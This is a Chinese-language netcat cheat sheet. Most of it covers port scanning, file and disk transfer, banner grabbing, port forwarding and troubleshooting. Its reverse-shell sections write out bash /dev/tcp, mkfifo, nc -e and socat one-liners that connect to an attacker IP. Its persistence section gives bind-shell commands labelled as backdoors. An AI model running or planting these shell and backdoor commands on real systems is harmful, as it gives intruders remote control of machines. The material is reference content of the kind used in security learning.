---
title: “nc”
---

**N**et**c**at 被称为网络界的”瑞士军刀”，它本质上是一个通过 TCP/UDP 协议读写网络数据的工具。除了测端口通不通，它还能传输文件、做端口转发、甚至当简易聊天室。

## 基本语法

```bash
nc [Option] [主机] [端口]
```

Option

| 参数 | 说明 |
| ------ | ------ |
| `-l` | 监听模式，用于接收连接 |
| `-p` | 指定端口号 |
| `-u` | 使用 UDP 协议，不指定默认 TCP |
| `-n` | 不做 DNS 解析，直接使用 IP |
| `-v` | 显示详细信息 |
| `-vv` | 更详细信息 |
| `-z` | 零 I/O 模式，扫描端口时不发送数据 |
| `-w` | 设置连接超时时间（秒） |
| `-q` | 传输完成后延迟关闭连接的时间，避免网络延迟导致数据丢失 |
| `-e` | 执行指定程序（需要编译时支持） |
| `-k` | 保持监听，客户端断开后继续监听（配合 `-l` 使用） |
| `-C` | 自动在行尾添加 CRLF（兼容 Windows） |
| `-4` | 强制使用 IPv4 |
| `-6` | 强制使用 IPv6 |

### 端口扫描

```bash
# 扫描单个端口
nc -zv 192.168.1.1 80

# 扫描多个端口
nc -zv 192.168.1.1 80 22 443

# 扫描端口范围
nc -zv 192.168.1.1 1-1000

# 扫描 UDP 端口
nc -zvu 192.168.1.1 53
```

### 端口监听

```bash
# 监听 TCP 端口
nc -lvnp 5678

# 监听 UDP 端口
nc -lvup 5678

# 指定超时时间
nc -lvnp 5678 -w 30

# 持久化监听（客户端断开后继续等待新连接）
nc -lkvp 5678

# 指定监听 IP（仅允许特定接口）
nc -lvnp 5678 -s 192.168.1.100
```

### 文件传输

```bash
# 接收端：监听并解压
nc -q 10 -lp 5678 | tar x

# 发送端：压缩并传输
tar c <file_name> | nc -q 10 <dest_ip> 5678

# 传输单个文件（接收端）
nc -lp 5678 > received_file.txt

# 传输单个文件（发送端）
nc -q 10 <dest_ip> 5678 < send_file.txt
```

### 简易聊天

两端连接后可以回车互相发送消息

```bash
# 端 A：监听
nc -lp 5678

# 端 B：连接
nc <dest_ip> 5678
```

## 获取 Banner（服务信息）

```bash
# 获取 HTTP banner
echo -e “HEAD / HTTP/1.0\r\n\r\n” | nc 192.168.1.1 80

# 获取 HTTP 响应头
echo -e “GET / HTTP/1.0\r\nHost: example.com\r\n\r\n” | nc 192.168.1.1 80

# 获取 HTTPS banner（需要 openssl）
openssl s_client -connect 192.168.1.1:443 </dev/null

# 获取 SSH 版本信息
nc 192.168.1.1 22

# 获取 SMTP banner
echo “QUIT” | nc -C mail.example.com 25

# 测试 HTTP 并显示响应（带超时）
{ echo -e “GET / HTTP/1.0\r\n\r\n”; sleep 2; } | nc -w 5 192.168.1.1 80
```

## 端口转发（正向代理）

```bash
# 将本地的 8080 端口转发到 192.168.1.1:80
nc -l -p 8080 -c “nc 192.168.1.1 80”

# 或者使用管道
nc -l -p 8080 | nc 192.168.1.1 80
```

## 反向 Shell

```bash
# 攻击者：监听
nc -lvnp 5678

# 目标机：连接（反弹 shell）
bash -i >& /dev/tcp/<attacker_ip>/5678 0>&1

# 或者（需要 nc 支持 -e 参数）
nc -e /bin/bash <attacker_ip> 5678
```

## 完整反弹 Shell（更可靠）

```bash
# 方式1：使用 /dev/tcp
bash -i >& /dev/tcp/192.168.1.100/5678 0>&1

# 方式2：使用 mkfifo
mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.1.100 5678 > /tmp/f

# 方式3：使用 socat（更推荐）
# 攻击者
socat TCP-LISTEN:5678 EXEC:/bin/bash

# 目标机
socat TCP:192.168.1.100:5678 EXEC:/bin/bash
```

## 注意事项

1. **安全风险**：`nc -e` 参数在某些发行版中默认禁用，出于安全考虑
2. **防火墙**：使用前确保防火墙放行了对应端口
3. **UDP 模式**：UDP 扫描结果不如 TCP 可靠
4. **权限**：绑定小于 1024 的端口需要 root 权限

## 持久化连接

```bash
# 保持监听，客户端断开后继续等待新连接（常用于后门）
nc -lknp 5678 -e /bin/bash

# 永久后门（带超时保护）
while true; do nc -lknp 5678 -c "bash -c 'exec 2>&1; $SHELL'"; done
```

## 网络测速与延迟测试

```bash
# 测试带宽（发送 1GB 零数据）
# 接收端
nc -lp 5678 > /dev/null

# 发送端
dd if=/dev/zero bs=1M count=1024 | nc -q 5 <dest_ip> 5678

# 测试延迟（TCP 握手时间）
time nc -zv <dest_ip> 80 2>&1
```

## 完整磁盘/分区传输

```bash
# 发送端：使用 dd 镜像磁盘
dd if=/dev/sda bs=4M | nc -q 10 <dest_ip> 5678

# 接收端：恢复磁盘（需要相同或更大容量）
nc -lp 5678 | dd of=/dev/sdb bs=4M

# 发送压缩镜像（节省带宽）
dd if=/dev/sda bs=4M | gzip -9 | nc -q 10 <dest_ip> 5678

# 接收压缩镜像
nc -lp 5678 | gzip -d | dd of=/dev/sdb bs=4M
```

## 目录同步

```bash
# 接收端：解压到目标目录
nc -lp 5678 | tar xzf - -C /target/dir

# 发送端：压缩目录并传输
tar czf - <dir_name> | nc -q 10 <dest_ip> 5678
```

## 远程执行命令（单向）

```bash
# 发送端：执行命令并发送结果
echo "ls -la /home" | nc -q 5 <dest_ip> 5678

# 接收端：监听并执行命令
nc -lkp 5678 | /bin/bash
```

## UDP 连接

```bash
# UDP 监听
nc -ulvp 5678

# UDP 连接发送消息
echo "hello" | nc -u <dest_ip> 5678

# UDP 文件传输（不可靠，仅内网使用）
# 接收端
nc -ulp 5678 > received_file.txt

# 发送端
nc -u <dest_ip> 5678 < send_file.txt
```

## 与 cron 配合（定时检查服务）

```bash
# crontab 中添加：每分钟检查服务是否存活
* * * * * nc -zw 2 <dest_ip> 80 || echo "Service down at $(date)" | mail admin
```

## 快速端口转发（临时跳板）

```bash
# 将本机 8080 收到的请求转发到远程 192.168.1.1:80
nc -lkp 8080 -c "nc 192.168.1.1 80"

# 透明代理（两边都转发）
mkfifo /tmp/fifo
nc -lkp 8080 < /tmp/fifo | nc 192.168.1.1 80 > /tmp/fifo
```

## ncat 增强版（nmap 套件）

ncat 是 nc 的增强版，提供 SSL/TLS 支持和更多安全特性：

```bash
# SSL/TLS 加密监听
ncat -lkp 5678 --ssl -e /bin/bash

# SSL/TLS 加密连接
ncat <dest_ip> 5678 --ssl

# 限制连接来源（仅允许特定 IP）
ncat -lkp 5678 --allow <trusted_ip> -e /bin/bash

# 禁止连接后保持监听（只允许单次连接）
ncat -lkp 5678 --single-connection -e /bin/bash
```

## 常见问题处理

```bash
# 问题：nc 卡住无响应
# 解决：确保两端都正确使用 -w 超时参数

# 问题：连接被拒绝
# 解决：检查防火墙规则（iptables -L 或 ufw status）

# 问题：数据传输不完整
# 解决：确保发送端使用 -q 参数延迟关闭，让数据有足够时间传输

# 问题：远程主机无响应
# 解决：使用 tcpdump/wireshark 分析网络包
#       tcpdump -i eth0 port 5678 -nn
```
